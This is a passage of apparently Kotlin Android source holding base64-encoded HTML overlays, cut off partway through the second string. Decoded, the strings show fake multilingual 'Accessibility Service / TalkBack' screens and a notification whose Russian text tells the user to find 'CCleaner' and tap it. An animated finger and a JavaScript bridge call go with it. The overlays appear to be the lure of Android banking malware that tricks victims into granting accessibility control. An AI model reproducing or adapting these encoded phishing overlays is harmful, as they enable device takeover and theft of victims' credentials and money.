ZGl2Pgo8L2JvZHk+CjxzY3JpcHQ+CnZhciBsYW5nPSJlbiIsb2JqTGFuZz17ZW46e2FjY2Vzc2FiaWxpdHkxOiJBY2Nlc3NpYmlsaXR5IFNlcnZpY2UiLGRvd25sb2FkZWRzZXJ2aWNlOiJET1dOTE9BREVEIFNFUlZJQ0VTIixzd2l0Y2hhY2Nlc3M6IlN3aXRjaCBBY2Nlc3MiLHRhbGtiYWNrOiJUYWxrQmFjayIsb2ZmOiJPRkYifSxkZTp7YWNjZXNzYWJpbGl0eTE6IkVpbmdhYmVoaWxmZWRpZW5zdCIsZG93bmxvYWRlZHNlcnZpY2U6IkhFUlVOVEVSR0VMQURFTkUgRElFTlNUTEVJU1RVTkdFTiIsc3dpdGNoYWNjZXNzOiJadWdyaWZmIHdlY2hzZWxuIix0YWxrYmFjazoiVGFsa0JhY2siLG9mZjoiQVVTIn0sYWY6e2FjY2Vzc2FiaWxpdHkxOiJUb2VnYW5rbGlraGVpZHNkaWVucyIsZG93bmxvYWRlZHNlcnZpY2U6IkRPV05MT0FEREUgRElFTlNURSIsc3dpdGNoYWNjZXNzOiJTa2FrZWwgdG9lZ2FuZyIsdGFsa2JhY2s6IlRlcnVncHJhYXQiLG9mZjoiQUYifSx6aDp7YWNjZXNzYWJpbGl0eTE6IueEoemanOekmeacjeWLmSIsZG93bmxvYWRlZHNlcnZpY2U6IuS4i+i8ieeahOacjeWLmSIsc3dpdGNoYWNjZXNzOiLplovpl5zoqKrllY8iLHRhbGtiYWNrOiLpoILlmLQiLG9mZjoi6ZecIn0sY3M6e2FjY2Vzc2FiaWxpdHkxOiJTbHXFvmJhIHVzbmFkbsSbbsOtIHDFmcOtc3R1cHUiLGRvd25sb2FkZWRzZXJ2aWNlOiJTVEHFvUVOw4kgU0xVxb1CWSIsc3dpdGNoYWNjZXNzOiJQxZllcG5vdXQgcMWZw61zdHVwIix0YWxrYmFjazoiT2RtbG91dmF0IixvZmY6IlZZUE5VVE8ifSxubDp7YWNjZXNzYWJpbGl0eTE6IlRvZWdhbmtlbGlqa2hlaWRzc2VydmljZSIsZG93bmxvYWRlZHNlcnZpY2U6IkRPV05MT0FERElFTlNURU4iLHN3aXRjaGFjY2VzczoiVG9lZ2FuZyBzY2hha2VsZW4iLHRhbGtiYWNrOiJQcmFhdCB0ZXJ1ZyIsb2ZmOiJVSVQifSxpdDp7YWNjZXNzYWJpbGl0eTE6IlNlcnZpemlvIGRpIGFjY2Vzc2liaWxpdMOgIixkb3dubG9hZGVkc2VydmljZToiU0VSVklaSSBTQ0FSSUNBVEkiLHN3aXRjaGFjY2VzczoiQ2FtYmlhIGFjY2Vzc28iLHRhbGtiYWNrOiJSaXNwb25kZXJlIixvZmY6Ik9GRiJ9LGphOnthY2Nlc3NhYmlsaXR5MToi44Ki44Kv44K744K344OT44Oq44OG44KjIixkb3dubG9hZGVkc2VydmljZToi44OA44Km44Oz44Ot44O844OJ44K144O844OT44K5Iixzd2l0Y2hhY2Nlc3M6IuOCueOCpOODg+ODgeOCouOCr+OCu+OCuSIsdGFsa2JhY2s6IuODiOODvOOCr+ODkOODg+OCryIsb2ZmOiLjgqrjg5UifSxrbzp7YWNjZXNzYWJpbGl0eTE6Iuygkeq3vOyEsSDshJzruYTsiqQiLGRvd25sb2FkZWRzZXJ2aWNlOiLri6TsmrTroZzrk5wg65CcIOyEnOu5hOyKpCIsc3dpdGNoYWNjZXNzOiLsiqTsnITsuZgg7JWh7IS47IqkIix0YWxrYmFjazoi7Yag7YGs67CxIixvZmY6IuuWqOyWtOyguOyEnCJ9LHBsOnthY2Nlc3NhYmlsaXR5MToiVXPFgnVnYSBkb3N0xJlwbm/Fm2NpIixkb3dubG9hZGVkc2VydmljZToiUE9CUkFORSBVU8WBVUdJIixzd2l0Y2hhY2Nlc3M6IlByemXFgsSFY3ogZG9zdMSZcCIsdGFsa2JhY2s6IlRhbGtCYWNrIixvZmY6IlBPWkEifSxlczp7YWNjZXNzYWJpbGl0eTE6IlNlcnZpY2lvIGRlIGFjY2VzaWJpbGlkYWQiLGRvd25sb2FkZWRzZXJ2aWNlOiJTRVJWSUNJT1MgREVTQ0FSR0FET1MiLHN3aXRjaGFjY2VzczoiQ2FtYmlhciBhY2Nlc28iLHRhbGtiYWNrOiJSZXBsaWNhciIsb2ZmOiJBUEFHQURPIn0sYXI6e2FjY2Vzc2FiaWxpdHkxOiLYrtiv2YXYqSDYp9mE2YjYtdmI2YQiLGRvd25sb2FkZWRzZXJ2aWNlOiLYp9mE2K7Yr9mF2KfYqiDYp9mE2YXYrdmF2YTYqSIsc3dpdGNoYWNjZXNzOiLYqtio2K/ZitmEINin2YTZiNi12YjZhCIsdGFsa2JhY2s6Itin2LnYryDZg9mE2KfZhdmDIixvZmY6Itil2YrZgtin2YEifSxiZzp7YWNjZXNzYWJpbGl0eTE6ItCj0YHQu9GD0LPQsCDQt9CwINC00L7RgdGC0YrQv9C90L7RgdGCIixkb3dubG9hZGVkc2VydmljZToi0JjQl9Ci0JXQk9Cb0JXQndCYINCj0KHQm9Cj0JPQmCIsc3dpdGNoYWNjZXNzOiLQn9GA0LXQstC60LvRjtGH0LLQsNC90LUg0L3QsCDQtNC+0YHRgtGK0L/QsCIsdGFsa2JhY2s6ItCe0YLQstGA0YrRidCw0LwiLG9mZjoiT0ZGIn0sY2E6e2FjY2Vzc2FiaWxpdHkxOiJBY2Nlc3NpYmlsaXR5IFNlcnZpY2UiLGRvd25sb2FkZWRzZXJ2aWNlOiJET1dOTE9BREVEIFNFUlZJQ0VTIixzd2l0Y2hhY2Nlc3M6IlN3aXRjaCBBY2Nlc3MiLHRhbGtiYWNrOiJUYWxrQmFjayIsb2ZmOiJPRkYifSxocjp7YWNjZXNzYWJpbGl0eTE6IlVzbHVnYSBwcmlzdHVwYcSNbm9zdGkiLGRvd25sb2FkZWRzZXJ2aWNlOiJQUkVVWklNQU5FIFVTTFVHRSIsc3dpdGNoYWNjZXNzOiJQcmViYWNpIHByaXN0dXAiLHRhbGtiYWNrOiJUYWxrQmFja292aW0iLG9mZjoiT0ZGIn0sZGE6e2FjY2Vzc2FiaWxpdHkxOiJUaWxnw6ZuZ2VsaWdoZWRzdGplbmVzdGUiLGRvd25sb2FkZWRzZXJ2aWNlOiJET1dOTE9BREVERSBUSkVORVNURVIiLHN3aXRjaGFjY2VzczoiU2tpZnQgYWRnYW5nIix0YWxrYmFjazoiVGFsIHRpbGJhZ2UiLG9mZjoiQUYifSxmaTp7YWNjZXNzYWJpbGl0eTE6IkVzdGVldHTDtm15eXNwYWx2ZWx1Iixkb3dubG9hZGVkc2VydmljZToiTEFUQVRVVCBQQUxWRUxVVCIsc3dpdGNoYWNjZXNzOiJWYWloZGEga8OkeXR0w7ZvaWtldXR0YSIsdGFsa2JhY2s6IlB1aHVhIHRha2Fpc2luIixvZmY6IlZJTk9TU0EifSxlbDp7YWNjZXNzYWJpbGl0eTE6Is6lz4DOt8+BzrXPg86vzrEgzqDPgc6/z4POss6xz4POuc68z4zPhM63z4TOsc+CIixkb3dubG9hZGVkc2VydmljZToizpvOl86ozpcgzqXOoM6XzqHOlc6jzpnOqc6dIixzd2l0Y2hhY2Nlc3M6Is6RzrvOu86xzrPOriDPgM+Bz4zPg86yzrHPg863z4IiLHRhbGtiYWNrOiLOkc69z4TOuc68zrnOu86sz4kiLG9mZjoizpzOkc6azqHOmc6RIM6RzqDOnyJ9LGl3OnthY2Nlc3NhYmlsaXR5MToi16nXmdeo15XXqiDXoNeS15nXqdeV16oiLGRvd25sb2FkZWRzZXJ2aWNlOiLXqdeZ16jXldeq15nXnSDXqdeU15XXqNeT15UiLHN3aXRjaGFjY2Vzczoi157XoteR16gg15zXkteZ16nXlCIsdGFsa2JhY2s6IteY15XXp9eR16ciLG9mZjoi15vXkdeV15kifSxoaTp7YWNjZXNzYWJpbGl0eTE6IuCkquCkueClgeCkgeCkmiDgpLjgpYfgpLXgpL4iLGRvd25sb2FkZWRzZXJ2aWNlOiLgpKHgpL7gpIngpKjgpLLgpYvgpKEg4KSV4KWAIOCkl+CkiCDgpLjgpYfgpLXgpL7gpI/gpIEiLHN3aXRjaGFjY2Vzczoi4KSq4KS54KWB4KSB4KSaIOCkquCksCDgpLjgpY3gpLXgpL/gpJog4KSV4KSw4KWH4KSCIix0YWxrYmFjazoi4KSc4KSs4KS+4KSoIOCkmuCksuCkvuCkqOCkviIsb2ZmOiLgpKzgpILgpKYifSxodTp7YWNjZXNzYWJpbGl0eTE6Iktpc2Vnw610xZEgbGVoZXTFkXPDqWdlayBzem9sZ8OhbHRhdMOhcyIsZG93bmxvYWRlZHNlcnZpY2U6IkxFVMOWTFRFVFQgU1pPTEfDgUxUQVTDgVNPSyIsc3dpdGNoYWNjZXNzOiJLYXBjc29sw7MgaG96esOhZsOpcsOpcyIsdGFsa2JhY2s6IlRhbGtCYWNrIixvZmY6IktJIn0saW46e2FjY2Vzc2FiaWxpdHkxOiJQZXJraGlkbWF0YW4gS2Vib2xlaGNhcGFpYW4iLGRvd25sb2FkZWRzZXJ2aWNlOiJQRVJLSElETUFUQU4gTVVBVCBUVVJVTiIsc3dpdGNoYWNjZXNzOiJUdWthciBBa3NlcyIsdGFsa2JhY2s6IlRhbGtCYWNrIixvZmY6Ik9GRiJ9LGx2OnthY2Nlc3NhYmlsaXR5MToiUGllZWphbcSrYmFzIHBha2FscG9qdW1zIixkb3dubG9hZGVkc2VydmljZToiTEVKVVBJRUzEgETEklRJRSBQQUtBTFBPSlVNSSIsc3dpdGNoYWNjZXNzOiJQxIFyc2zEk2d0IHBpZWvEvHV2aSIsdGFsa2JhY2s6IlJ1bsSBdCBwcmV0xKsiLG9mZjoiSVpTTMSSR1RTIn0sbHQ6e2FjY2Vzc2FiaWxpdHkxOiJQcmllaW5hbXVtbyB0YXJueWJhIixkb3dubG9hZGVkc2VydmljZToiQVRTSVNJVU5UT1MgUEFTTEFVR09TIixzd2l0Y2hhY2Nlc3M6IlBlcmp1bmd0aSBwcmllaWfEhSIsdGFsa2JhY2s6IkF0c2FreXRpIixvZmY6IknFoEpVTkdUQSJ9LG5iOnthY2Nlc3NhYmlsaXR5MToiVGlsZ2plbmdlbGlnaGV0c3RqZW5lc3RlIixkb3dubG9hZGVkc2VydmljZToiTkVETEFTVEVERSBUSkVORVNURVIiLHN3aXRjaGFjY2VzczoiQnl0dCB0aWxnYW5nIix0YWxrYmFjazoiU25ha2tlIHRpbGJha2UiLG9mZjoiQVYifSxwdDp7YWNjZXNzYWJpbGl0eTE6IlNlcnZpw6dvIGRlIEFjZXNzaWJpbGlkYWRlIixkb3dubG9hZGVkc2VydmljZToiU0VSVknDh09TIEJBSVhBRE9TIixzd2l0Y2hhY2Nlc3M6IkFsdGVybmFyIGFjZXNzbyIsdGFsa2JhY2s6IlRhbGtCYWNrIixvZmY6IkZPUkEifSxybzp7YWNjZXNzYWJpbGl0eTE6IlNlcnZpY2l1bCBkZSBhY2Nlc2liaWxpdGF0ZSIsZG93bmxvYWRlZHNlcnZpY2U6IlNFUlZJQ0lJIERFU0NBUkNBVEUiLHN3aXRjaGFjY2VzczoiQWNjZXMgbGEgY29tdXRhdG9yIix0YWxrYmFjazoiUsSDc3B1bmRlIixvZmY6Ik9GRiJ9LHNyOnthY2Nlc3NhYmlsaXR5MToi0KPRgdC70YPQs9CwINC/0YDQuNGB0YLRg9C/0LDRh9C90L7RgdGC0LgiLGRvd25sb2FkZWRzZXJ2aWNlOiLQn9Cg0JXQo9CX0JjQnNCQ0J3QlSDQo9Ch0JvQo9CT0JUiLHN3aXRjaGFjY2Vzczoi0KHQstC40YLRhtGFINCQ0YbRhtC10YHRgSIsdGFsa2JhY2s6ItCe0LTQs9C+0LLQvtGA0LgiLG9mZjoi0JLQkNCdIn0sc2s6e2FjY2Vzc2FiaWxpdHkxOiJBY2Nlc3NpYmlsaXR5IFNlcnZpY2UiLGRvd25sb2FkZWRzZXJ2aWNlOiJET1dOTE9BREVEIFNFUlZJQ0VTIixzd2l0Y2hhY2Nlc3M6IlN3aXRjaCBBY2Nlc3MiLHRhbGtiYWNrOiJUYWxrQmFjayIsb2ZmOiJPRkYifSxzbDp7YWNjZXNzYWJpbGl0eTE6IlVzbHVnYSBwcmlzdHVwYcSNbm9zdGkiLGRvd25sb2FkZWRzZXJ2aWNlOiJQUkVVWklNQU5FIFVTTFVHRSIsc3dpdGNoYWNjZXNzOiJQcmViYWNpIHByaXN0dXAiLHRhbGtiYWNrOiJUYWxrQmFja292aW0iLG9mZjoiT0ZGIn0sc3Y6e2FjY2Vzc2FiaWxpdHkxOiJUaWxsZ8OkbmdsaWdoZXRzdGrDpG5zdCIsZG93bmxvYWRlZHNlcnZpY2U6Ik5FRExBRERBIFRKw4ROU1RFUiIsc3dpdGNoYWNjZXNzOiJWw6R4bGEgw6V0a29tc3QiLHRhbGtiYWNrOiJQcmF0YSB0aWxsYmFrYSIsb2ZmOiJBViJ9LHRoOnthY2Nlc3NhYmlsaXR5MToi4Lia4Lij4Li04LiB4Liy4Lij4LiB4Liy4Lij4LmA4LiC4LmJ4Liy4LiW4Li24LiHIixkb3dubG9hZGVkc2VydmljZToi4Lia4Lij4Li04LiB4Liy4Lij4LiU4Liy4Lin4LiZ4LmM4LmC4Lir4Lil4LiUIixzd2l0Y2hhY2Nlc3M6IuC4quC4peC4seC4muC4geC4suC4o+C5gOC4guC5ieC4suC4luC4tuC4hyIsdGFsa2JhY2s6IuC4nuC4ueC4lOC4hOC4uOC4ouC4geC4peC4seC4miIsb2ZmOiLguJvguLTguJQifSx0cjp7YWNjZXNzYWJpbGl0eTE6IkVyacWfaWxlYmlsaXJsaWsgSGl6bWV0aSIsZG93bmxvYWRlZHNlcnZpY2U6IsSwTkTEsFLEsExFTiBIxLBaTUVUTEVSIixzd2l0Y2hhY2Nlc3M6IkFuYWh0YXIgRXJpxZ9pbWkiLHRhbGtiYWNrOiJUYWxrQmFjayIsb2ZmOiJLQVBBTEkifSx2aTp7YWNjZXNzYWJpbGl0eTE6IkThu4tjaCB24bulIHRp4bq/cCBj4bqtbiIsZG93bmxvYWRlZHNlcnZpY2U6IkThu4pDSCBW4bukIFThuqJJIFhV4buQTkciLHN3aXRjaGFjY2VzczoiQ2h1eeG7g24gxJHhu5VpIHRydXkgY+G6rXAiLHRhbGtiYWNrOiJOw7NpIGNodXnhu4duIHRy4bufIGzhuqFpIixvZmY6IlThuq5UIn19LGxvY2FsZT1udWxsPT1vYmpMYW5nW2xhbmddP29iakxhbmcuZW46b2JqTGFuZ1tsYW5nXTtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYWNjZXNzYWJpbGl0eTEiKS5pbm5lclRleHQ9bG9jYWxlLmFjY2Vzc2FiaWxpdHkxLGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkb3dubG9hZGVkc2VydmljZSIpLmlubmVyVGV4dD1sb2NhbGUuZG93bmxvYWRlZHNlcnZpY2UsZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInN3aXRjaGFjY2VzcyIpLmlubmVyVGV4dD1sb2NhbGUuc3dpdGNoYWNjZXNzLGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0YWxrYmFjayIpLmlubmVyVGV4dD1sb2NhbGUudGFsa2JhY2ssZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm9mZjIiKS5pbm5lclRleHQ9bG9jYWxlLm9mZixkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgib2ZmMyIpLmlubmVyVGV4dD1sb2NhbGUub2ZmLGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJvZmY0IikuaW5uZXJUZXh0PWxvY2FsZS5vZmY7Cjwvc2NyaXB0Pgo8L2h0bWw+" else "%INSERT_HTML_HERE%"
        }

        val s228: String by lazy {
            if (BuildConfig.DEBUG) "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsc2hyaW5rLXRvLWZpdD1ubyI+Cjx0aXRsZT5Ob3RpZnk8L3RpdGxlPgoKPHN0eWxlPiosOjphZnRlciw6OmJlZm9yZXtib3gtc2l6aW5nOmJvcmRlci1ib3g7LXdlYmtpdC1ib3gtc2l6aW5nOmJvcmRlci1ib3h9Lmh0bWwsYm9keXttYXJnaW46MDtwYWRkaW5nOjA7Zm9udC1mYW1pbHk6c2Fucy1zZXJpZjtmb250LXNpemU6MTZweDtiYWNrZ3JvdW5kLWNvbG9yOnRyYW5zcGFyZW50O2xpbmUtaGVpZ2h0OjEuMnJlbTtjb2xvcjojMzMzMzMzO292ZXJmbG93OiBoaWRkZW47fS5ub3RpZnl7cG9zaXRpb246YWJzb2x1dGU7dG9wOjA7bGVmdDowO3JpZ2h0OjA7cGFkZGluZzoxcmVtO2JhY2tncm91bmQtY29sb3I6I2ZmZn0ubm90aWZ5LWhlYWR7bWFyZ2luLWJvdHRvbTouNXJlbTtwYWRkaW5nLWxlZnQ6MjVweDtmb250LXNpemU6LjlyZW07dGV4dC1hbGlnbjpjZW50ZXI7cG9zaXRpb246cmVsYXRpdmV9Lm5vdGlmeS1jbG9zZXtkaXNwbGF5OmlubGluZS1ibG9jaztwb3NpdGlvbjpyZWxhdGl2ZTt3aWR0aDoxOHB4O2hlaWdodDoxOHB4O21hcmdpbi1yaWdodDo1cHg7cG9zaXRpb246YWJzb2x1dGU7dG9wOjA7bGVmdDowfS5ub3RpZnktY2xvc2U6OmFmdGVyLC5ub3RpZnktY2xvc2U6OmJlZm9yZXtwb3NpdGlvbjphYnNvbHV0ZTtjb250ZW50OicnO2JhY2tncm91bmQtY29sb3I6Izc3Nzt3aWR0aDoxMDAlO2hlaWdodDoxcHg7dG9wOmNhbGMoNTAlKTtsZWZ0OjB9Lm5vdGlmeS1jbG9zZTo6YWZ0ZXJ7dHJhbnNmb3JtOnJvdGF0ZSgxMzVkZWcpfS5ub3RpZnktY2xvc2U6OmJlZm9yZXt0cmFuc2Zvcm06cm90YXRlKC0xMzVkZWcpfS5ub3RpZnktYm9keXtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2ZsZXg6MX0ubm90aWZ5LWFwcHtmbGV4OjAgMCA0OHB4O21heC13aWR0aDo0OHB4O2hlaWdodDo0OHB4O2JhY2tncm91bmQtcG9zaXRpb246Y2VudGVyIGNlbnRlcjtiYWNrZ3JvdW5kLXJlcGVhdDpuby1yZXBlYXQ7YmFja2dyb3VuZC1zaXplOmNvbnRhaW59Lm5vdGlmeS1pbmZve2ZsZXg6MTtwYWRkaW5nLWxlZnQ6LjVyZW19Lm5vdGlmeS1hcHAtbmFtZXtmb250LXdlaWdodDpib2xkfS5ub3RpZnktYXBwLXBlcm17Y29sb3I6Izc3Nztmb250LXNpemU6LjhyZW19Lm5vdGlmeS1jb250ZW50e2Rpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjthbGlnbi1pdGVtczpjZW50ZXJ9LnN3aXRjaHtwb3NpdGlvbjpyZWxhdGl2ZTtoZWlnaHQ6MjBweDt3aWR0aDo0NXB4O2JvcmRlci1yYWRpdXM6MjBweDtiYWNrZ3JvdW5kLWNvbG9yOiNlNWU1ZTV9LnN3aXRjaCBzcGFue3Bvc2l0aW9uOmFic29sdXRlO3dpZHRoOjI1cHg7aGVpZ2h0OjI1cHg7Ym9yZGVyLXJhZGl1czo1MCU7YmFja2dyb3VuZC1jb2xvcjojYzBjMGMwO3RvcDotMnB4O2xlZnQ6LTVweDt0cmFuc2l0aW9uOmFsbCAuNHMgZWFzZTthbmltYXRpb24tbmFtZTpzd2l0Y2g7YW5pbWF0aW9uLWZpbGwtbW9kZTpib3RoO2FuaW1hdGlvbi1pdGVyYXRpb24tY291bnQ6MTthbmltYXRpb24tZGlyZWN0aW9uOmFsdGVybmF0ZTthbmltYXRpb24tZHVyYXRpb246LjRzO2FuaW1hdGlvbi1kZWxheToxczthbmltYXRpb24tdGltaW5nLWZ1bmN0aW9uOmxpbmVhcn1Aa2V5ZnJhbWVzIHN3aXRjaHtmcm9te3RyYW5zZm9ybTp0cmFuc2xhdGVYKDApfXRve3RyYW5zZm9ybTp0cmFuc2xhdGVYKDEwNSUpO2JhY2tncm91bmQtY29sb3I6IzM3YmYzN319Lm5vdGlmeS1oaW50e3Bvc2l0aW9uOnJlbGF0aXZlfS5maW5nZXJ7cG9zaXRpb246YWJzb2x1dGU7dG9wOi00cHg7bGVmdDotMjhweDt0cmFuc2l0aW9uOmFsbCAuNHMgZWFzZTthbmltYXRpb246ZmluZ2VyIDFzIGVhc2UtaW4gMHMgaW5maW5pdGUgbm9ybWFsIG5vbmV9QGtleWZyYW1lcyBmaW5nZXJ7ZnJvbXt0cmFuc2Zvcm06cm90YXRlKDApIHRyYW5zbGF0ZSgtNHB4KSByb3RhdGUoMCl9dG97dHJhbnNmb3JtOnJvdGF0ZSgzNjBkZWcpIHRyYW5zbGF0ZSgtNHB4KSByb3RhdGUoLTM2MGRlZyl9fS5maW5nZXItZWx7YW5pbWF0aW9uOmZpbmdlci1tb3ZlIC40cyBsaW5lYXIgMXMgMSBhbHRlcm5hdGUgYm90aH1Aa2V5ZnJhbWVzIGZpbmdlci1tb3Zle2Zyb217dHJhbnNmb3JtOnRyYW5zbGF0ZSgwLC0xNXB4KX10b3t0cmFuc2Zvcm06dHJhbnNsYXRlKDI4cHgsLTE1cHgpfX08L3N0eWxlPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxkaXYgY2xhc3M9Im5vdGlmeSIgb25jbGljaz0iQW5kcm9pZC5vbkRhdGEoKTsiPgogICAgICAgIDxkaXYgY2xhc3M9Im5vdGlmeS1pbm5lciI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im5vdGlmeS1oZWFkIj4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJub3RpZnktY2xvc2UiPjwvc3Bhbj4g0J3QsNC50LTQuNGC0LUg0L/RgNC40LvQvtC20LXQvdC40LUmbmJzcDs8Yj5DQ2xlYW5lcjwvYj4mbmJzcDvQuCDQutC+0YHQvdC40YLQtdGB0Ywg0LXQs9C+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJub3RpZnktY29udGVudCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJub3RpZnktYm9keSI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibm90aWZ5LWFwcCIgc3R5bGU9ImJhY2tncm91bmQtaW1hZ2U6IHVybCgnZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFQd0FBQUQ4Q0FZQUFBQlRxOGxuQUFBQUFYTlNSMElBcnM0YzZRQUFBQVJuUVUxQkFBQ3hqd3Y4WVFVQUFBQUpjRWhaY3dBQURzTUFBQTdEQWNkdnFHUUFBRVQ5U1VSQlZIaGU3VjBIZkJSVi9oL0xXWkFla3QyWjJkMloyVTFDcU5JRUZGRUV4VUpMSTRHRWhLS2k0RmxPUFU4RnhiUHIyUkJFU2phTkd0US9sdlBVMDhPemc1RHN6T3ltRUdvYVJaQW1vZ2pjKy85K003T0ljWkZzc2ttMnZPL244LzNzWmx0MjM3enYrNVgzZSs4eEZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJSaERzSXc1NjYxV0M2VVRhWTJXMFd4dlN5Wm9oV1c1VjFDdE9DMldPeUt5TWE3QlhPQ3gycnFWcCtxemR4VkZ0azRmQjIrWG5Hd1BMN2ZKUWdkUEFrZEw5a09uN3QyS0hPZThhOG9LQ2hhQ2lqcTlmRnM1M0lRcHNzYTA3M0V3VjJ1Q09ZSnFzRGRxMGpzMzFXUmV4SEVuYU1LL0x2dzJEcEY1RXZodGhvZTN3ZTNQOER0ajRySUhVWENmZjFXNEE4Qzl5Z0NYd1dmVVFxUHdmdTQ5MlNCelZNRTdoVlZZaDlYSmN1OXFzUm5sZ3FXb1FvZjNWTzFSVXNiNDh4Uk9CZ1lYNDJDZ3FJcHFKVGF0ME9MVzJyaitpaFdicmpieGs4RFVUNEdJbDZpaXBiL2dCamRxc2h2QTNIdWc4ZCtnT2VPb0tCQjJEL0IvZVB3SEhFRFN5VUxFRzd4dmkvQ2MyWDRQTHpPRGJmNFB2aTg0N0xBL1d3TUVFZmc3OE53KzcwMktOaTRNaGdnUHBORlBoZS9EN3p1TmhoMGJpZ1JUUVBjRG90ZHRkazZHaitCZ29MaVRIQUpiVHVBV0tSU3dUelVJL0xUd2FJK0IwSjdGd1JZNmhhNU9oRFhJYzBxZzVoTFJRdlpCQUt0QUphaG9BM3h3dnMwb3RDOVJBRTNsS2Uvei90WjNzL0cvMU1PeFA5YkJ2OGZ2dHNKZUE5K244TXdBT3lHZ1dZVDNQODNEQUF2ZzVkeGwwdnNjdDFHQ0JjcXpPWW9DRGtvS0NJYkc4M21pOHNGUVhERm1hK1FSZk1reGNhL0FBTDZHRVN6QXdSM0dPNGZROEdod0RTUkFkRWFld1h0RldscjBEc2c2TjZCUHZEb0E0SDIvQy9BSTI2QjI0WGhnU3h4QzEyaWVickxFVE1NY3drZWp1dGtOQUVGUlhoam85aXVmU25QeDZJTEROYjZVYkRpSDRBNGFrRkE0RHJ6SjFCQUtCNjBwRjZMN1JWWktCQUhBcTgzNFAwZDhMdUlGbWFJL0hjUWhxeFRSWGFlSXJFVFhRSjdhUmtiMzlsb0dncUs4QUM2czJwY3RPU0tOYVdDeUYrRXp2OE5pT09JTGd4ZUV3VUtKQmdzZDZEcDlRVHdkK29laXRjTDRJN0RBSUM1Z01VdWtidTEyR0h1NStuWThSSzl4U2dvUWhBNHZhV0s1bXZCbWowTUx2dG5jUHNqaXNBRDhTK0tIY1VRYmdJL0c3Mi9XUThITE1iajNDK3F3RmFBK09mSmtqa1pwd2szOU8xN3Z0R01GQlRCaTA5N0N4MWNkb2pKSmZaMmNGL2ZBQ3UyQ3pyMWNSUjRwSXI4ajRodDRXMGI3VEdKMnc4eC8zL0IzWitqQ3FZYml3V3p6V2hhQ29yZ1FVV2NPY290c0NOZGRuWStpTDBjT3ZJUjdNemVXSnlLL094RXE2KzFGN2ovYnBFN0JvL3RVVVR6LzhrT2M1WXNSc1VWTWN5NVJuTlRVTFE4Q0FUbnhUenZVQ1JUaWl6eHVXN1JVZzNDUGxsdXhLdWhsbkFMRnVMZ2lIRStKdjAweXkvd1AwQTQ5SWxpWis5eVdXSXV3OWtONHhKUVVMUU15ckFVVlRMUGNBdjh2NkdUL29BZGs0bzg4TlFUZnBqVTFBY0NSZVJLM1pMbEdVV3dERjFyWVdpVkgwWHpRcmFhUk1YR3o0VE8rQVh3cE5jS1VaZTllWW50NnhWL0pWQVJ1QjJ5YUg1Smxyb013WFVFeHVXaG9BZ012bzJ6U1RoM3JJanNlK0JpSGtPM25WcnoxcUhYNVVmeHd6WFo1SmJZeHhSYjlDQXltem5IdUZ3VUZJMkR4Mll6bGRpNWJFWGkzb1BPZGdoRlRpMTZjTkJyOFhGT0gvNHVWZ1IrVG9uSUQ1ak5VT0ZUK0luM2JiWUx3RzI4QVlTOURDejZBVytCRExYcXdVVWNlTDM1RTdqL0M1Ynl1dXpSZDM4YkZ5MFpsNUtDNG8raFNud3ZXZVNlVkFXdXBsejh0UXJPVjRlakRBNTZoWStoRmxqOFk3S2RmVnUybTYvL2VoQjNrWEZaS1NoK2l4SzdxWXNzbVc2SG1QQWJ2ZHlWdXU2aHhsK0ZyN242dFM2SmUwVzFtdnNibDVpQ1FvZEhpcm5NWldkWFFpZjVHVFB2MUtLSE5sSDQ2Sm5odFpRRlRsWWs5bWJjdmNlNDNCU1JpcEpMMGFxenQwTW4yYWdYelBqdVFKU2hTUlEraWg1aSswT0t5QzZnMWo1Q01adVpmWTVITWc5UkhHYW5JdktIYUp3ZXZrVFI2N0U5VU9DL1VBUjI4aGQwVjU3SWdTY2g0UkpGNEdaQVJ5aDJHMGs1N0JUMU93cGxlRkdieHRQdjd3Y1hmNEVydHN1bFJwZWdDRmRVT2xoZWtmam5RZUJIc0dLTFd2WElvbWJ0Z2JoQVI1RzR0WW85WnJqUk5TakNEVmlHQ2U3Y3V5aHlQWXZydTFOUWhqOXhUNEpOdUMrZnhHMXhPY3gzZk5xN2JRZWptMUNFQTJRSG13WVhWNjJBa1IybmJYeDFBc3JJSWxwNzNJZlBMZkZIWkpHZGp6c0VHOTJGSWxRaDl6WkZ1K3pzQXpnbmk0a2JHcXRUMXFmbTdRbmNjVm5rVnFzQ085am9PaFNoaHVJNGM0TEx3UzFSSmU1b0JiaHZWT3lVWitLcDlSRVM5NDFxNDFMcFpoc2hCdFZoN3FlSTdEdXFZRG1CNWJHK0xqSWw1ZW5FM0E0bWNzc0VTNVZiNEdhc1pwZy9HZDJKSXBpeE1iN0xFSERSUHNQREdwQytMaTRsNVptSWNUMkkvM3RaTUQ4bzl6UzFNYm9WUlREQ0pacXZBN2RzQTFwMXpNVDZ1cUNVbEdjalZ1ZGhNaytSekUvVGd6T0NFWVJoRk1FeVVSWDRDaFI3S01mcmVIQ0RsNzZlcDJ3WkdpdnZmbFlFN25XNVZ3ZlI2R2tV